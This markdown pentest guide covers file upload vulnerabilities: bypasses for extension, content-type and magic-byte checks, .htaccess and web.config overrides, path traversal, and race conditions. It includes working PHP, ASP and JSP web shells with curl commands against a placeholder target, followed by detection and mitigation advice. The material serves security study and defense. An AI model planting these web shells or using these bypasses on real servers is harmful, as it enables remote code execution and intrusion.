% Filename: 04-web-testing/file-attacks/file-upload.md
% Display name: File Upload Vulnerabilities
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0002 (Execution), TA0011 (Command and Control)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application), T1105 (Ingress Tool Transfer)
% Authors: @TristanInSec

# File Upload Vulnerabilities

## Overview

File upload vulnerabilities occur when an application allows users to upload files without sufficient validation of the file's type, content, or destination. Attackers upload executable files (web shells, scripts) that the server then executes, leading to remote code execution. Even without direct execution, uploaded files can overwrite critical files, deliver client-side attacks, or fill disk space.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application
- **Tactic:** TA0011 - Command and Control
- **Technique:** T1105 - Ingress Tool Transfer

## Prerequisites

- Application has file upload functionality
- Uploaded files are stored in a web-accessible directory (for direct execution)
- Insufficient validation of file extension, content type, or content
- Server configured to execute uploaded file types (e.g., PHP, ASP, JSP)

## Detection Methodology

### Identifying Upload Endpoints

- Profile picture / avatar uploads
- Document upload forms (resume, attachment)
- Import functionality (CSV, XML, JSON)
- CMS media libraries
- Support ticket file attachments
- API endpoints accepting file uploads

### Testing Approach

1. Upload a legitimate file — note the upload path, URL, and filename handling
2. Test extension validation — try uploading executable extensions
3. Test content-type validation — modify the `Content-Type` header
4. Test content validation — check if magic bytes or file content is inspected
5. Test filename handling — try path traversal in the filename, overlong names, special characters

## Techniques

### No Validation

Upload a web shell directly when no validation exists:

```bash
# PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload and access
curl -F "file=@shell.php" http://target.com/upload
curl "http://target.com/uploads/shell.php?cmd=id"
```

### Extension Bypass

**Alternative PHP extensions:**

```text
.php3
.php4
.php5
.php7
.pht
.phtml
.phar
.phps
.pgif
.shtml
.inc
```

**Alternative ASP extensions:**

```text
.asp
.aspx
.ashx
.asmx
.cer
.config
```

**Alternative JSP extensions:**

```text
.jsp
.jspx
.jsw
.jsv
.jspf
```

**Case variation:**

```text
.pHp
.PhP
.PHP
.Php
```

**Double extensions:**

```text
shell.php.jpg        (server processes .php if configured loosely)
shell.php.png
shell.jpg.php        (some servers check only the last extension)
```

**Null byte in extension (older systems):**

```text
shell.php%00.jpg     (URL-encoded null byte)
shell.php\x00.jpg    (raw null byte)
```

**Trailing characters:**

```text
shell.php.           (trailing dot — Windows strips it)
shell.php            (trailing space)
shell.php;.jpg       (semicolon — IIS may process up to semicolon)
shell.php::$DATA     (NTFS alternate data stream — Windows/IIS)
```

### Content-Type Bypass

The `Content-Type` header in the multipart upload is client-controlled. Change it to an allowed type:

```bash
# Upload PHP shell with image content type
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload
curl -F "file=@shell.php;type=image/png" http://target.com/upload
curl -F "file=@shell.php;type=image/gif" http://target.com/upload
```

Or modify the request in Burp Suite — change `Content-Type: application/x-php` to `Content-Type: image/jpeg` in the multipart body.

### Magic Byte Bypass

Some applications check the file's magic bytes (file signature) rather than the extension. Prepend valid image magic bytes to a PHP shell:

```bash
# GIF magic bytes + PHP shell
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif

# JPEG magic bytes + PHP shell (hex: FF D8 FF E0)
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# PNG magic bytes + PHP shell (hex: 89 50 4E 47)
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png
```

If the server checks magic bytes but processes based on extension, the PHP code still executes.

### Polyglot Files

Create files that are both valid images and contain executable code:

```bash
# Create a valid JPEG that contains PHP code in EXIF metadata
# exiftool
# https://exiftool.org/
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate.jpg
cp legitimate.jpg shell.php.jpg
```

### .htaccess Upload

If the application allows uploading `.htaccess` files (Apache), override server configuration:

```bash
# .htaccess that makes .jpg files execute as PHP
echo 'AddType application/x-httpd-php .jpg' > .htaccess

# Upload .htaccess first, then upload shell.jpg
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
```

### web.config Upload (IIS)

Upload a `web.config` to enable ASP execution in the upload directory:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

### Path Traversal in Filename

If the application uses the uploaded filename to determine the storage path:

```text
filename="../../../var/www/html/shell.php"
filename="....//....//....//var/www/html/shell.php"
```

In the multipart form data (Burp Suite):

```text
Content-Disposition: form-data; name="file"; filename="../shell.php"
```

### Race Condition Upload

Some applications upload the file first, then validate and delete if invalid. Upload and access the file before validation completes:

```bash
# Custom script created for this guide
# Continuously upload and request the shell in parallel
while true; do
  curl -s -F "file=@shell.php" http://target.com/upload &
  curl -s "http://target.com/uploads/shell.php?cmd=id" &
done
```

Burp Intruder with null payloads and high thread count can also exploit this race condition.

### SVG Upload to XSS

If SVG files are accepted and served inline, inject JavaScript:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <script>alert(document.domain)</script>
</svg>
```

### Common Web Shells

**PHP:**

```php
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_GET["cmd"]); ?>
<?php passthru($_GET["cmd"]); ?>
<?= `$_GET[cmd]` ?>
```

**ASP:**

```asp
<%eval request("cmd")%>
```

**JSP:**

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) { out.println(line); }
%>
```

## Detection Methods

### Network-Based Detection

- File uploads with executable extensions (`.php`, `.asp`, `.jsp`, `.aspx`)
- Mismatched content type and file extension in multipart uploads
- Known web shell signatures in uploaded file content
- Requests to newly uploaded files with query parameters (`?cmd=`)

### Host-Based Detection

- New executable files appearing in upload/web directories
- File integrity monitoring (FIM) alerts on web-accessible directories
- Web server process spawning child shells after request to uploaded file path
- Antivirus/EDR detection of known web shell patterns

## Mitigation Strategies

- **Whitelist allowed extensions** — only permit known-safe file types (`.jpg`, `.png`, `.pdf`). Reject everything else. Never blacklist — there are too many executable extensions to block
- **Validate file content** — check magic bytes AND file structure (use a library that fully parses the image/document format, not just the first few bytes)
- **Rename uploaded files** — generate random filenames server-side. Never use the original filename. This prevents extension tricks and path traversal
- **Store outside web root** — upload files to a directory that is not web-accessible. Serve files through a download script that sets `Content-Disposition: attachment` and a safe `Content-Type`
- **Disable execution in upload directories** — configure the web server to never execute scripts in the upload directory (Apache: `php_flag engine off` in `.htaccess`; Nginx: no `location` block passing to PHP-FPM for upload paths)
- **File size limits** — enforce maximum file size to prevent disk exhaustion
- **Antivirus scanning** — scan uploaded files for known malware signatures

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP - Testing for Unrestricted File Upload](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
